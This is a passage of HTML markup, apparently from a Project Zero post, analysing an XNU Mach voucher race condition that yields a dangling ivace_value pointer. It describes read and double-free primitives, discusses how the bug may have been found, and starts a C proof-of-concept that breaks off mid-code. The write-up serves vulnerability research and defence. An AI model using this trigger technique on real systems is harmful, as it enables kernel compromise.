BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;This is why the absolute value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t important; all that matters is whether or not it&amp;#39;s equal to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;. And the only purpose of that is to determine whether there&amp;#39;s another thread in that window shown above.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;So how can we make something bad happen? Well, let&amp;#39;s assume that we successfully trigger the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;non-atomic increment and end up with a value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is one less than &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;. What does this do to the race window detection logic? It completely flips it! If, in the steady-state &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one less than &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we race two threads; thread A which is dropping the last &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_ref&lt;/span&gt;&lt;span&gt;&amp;nbsp;and thread B which is attempting to revive it and thread B is in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c23"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above then &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;gets incremented before &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;, but since &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;started out one &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;lower&lt;/span&gt;&lt;span&gt;&amp;nbsp;than &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;(due to the successful earlier trigger of the non-atomic increment) then &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is now exactly &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span&gt;; the exact condition which indicates we cannot possibly be in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c23"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above, and it&amp;#39;s safe to free the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;which is in fact live on thread B&amp;#39;s stack!&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Thread B then ends up with a revived &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a dangling &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;This gives an attacker two primitives that together would be more than sufficient to successfully exploit this bug: the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;mach_voucher_extract_attr_content&lt;/span&gt;&lt;span&gt;&amp;nbsp;voucher port MIG method would allow reading memory through the dangling &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer, and deallocating the voucher port would allow a controlled extra &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;kfree&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;of the dangling pointer.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;With the insight that you need to trigger these two race windows (the non-atomic increment to make &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;one too low, then the last-ref vs revive race) it&amp;#39;s trivial to write a PoC to demonstrate the issue; simply allocate and deallocate voucher ports on two threads, with at least one of them using a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;sub-recipe command. Pretty quickly you&amp;#39;ll hit the two race conditions correctly.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.fapbpabhxf26"&gt;&lt;span&gt;Conclusions&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;It&amp;#39;s interesting to think about how this vulnerability might have been found. Certainly somebody did find it, and trying to figure out how they might have done that can help us improve our vulnerability research techniques. I&amp;#39;ll offer four possibilities:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;1) Just read the code&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Possible, but this vulnerability is quite deep in the code. This would have been a marathon auditing effort to find and determine that it was exploitable. On the other hand this attack surface is reachable from every sandbox making vulnerabilities here very valuable and perhaps worth the investment.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;2) Static lock-analysis tooling&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;This is something which we&amp;#39;ve discussed within Project Zero over many afternoon coffee chats: could we build a tool to generate a fuzzy mapping between locks and objects which are probably meant to be protected by those locks, and then list any discrepancies where the lock isn&amp;#39;t held? In this particular case &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places; one time the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;is held and the other time it isn&amp;#39;t. Perhaps tooling isn&amp;#39;t even required and this could just be a technique used to help guide auditing towards possible race-condition vulnerabilities.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;3) Dynamic lock-analysis tooling&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Perhaps tools like &lt;/span&gt;&lt;span class="BGLtzooHlW-c21"&gt;&lt;a class="BGLtzooHlW-c251" href="https://clang.llvm.org/docs/ThreadSanitizer.html"&gt;ThreadSanitizer&lt;/a&gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;could be used to dynamically record a mapping between locks and accessed objects/object fields. Such a tool could plausibly have flagged this race condition under normal system use. The false positive rate of such a tool might be unusably high however.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;4) Race-condition fuzzer&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;It&amp;#39;s not inconceivable that a coverage-guided fuzzer could have generated the proof-of-concept shown below, though it would specifically have to have been built to execute parallel testcases.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;As to what technique was actually used, we don&amp;#39;t know. As defenders we need to do a better job making sure that we invest even more effort in all of these possibilities and more.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.hmmckgsh9ct0"&gt;&lt;span class="BGLtzooHlW-c20"&gt;PoC:&lt;/span&gt;&lt;/h2&gt;&lt;a id="t.236cca22f08a2d4239acb5bcd559819eddfeeef7"&gt;&lt;/a&gt;&lt;a id="t.57"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;mach/mach.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;mach/mach_voucher.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;atm/atm_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#include&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;lt;voucher/ipc_pthread_priority_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;// @i41nbeer&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;mach_port_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;create_voucher_from_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;size_t recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_port_t voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_PORT_NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; kern_return_t kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;host_create_mach_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_host_self&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_raw_recipe_array_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;quot;failed to create voucher from recipe\n&amp;quot;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;))&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_buf &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint8_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)+&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;template_size_out &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span 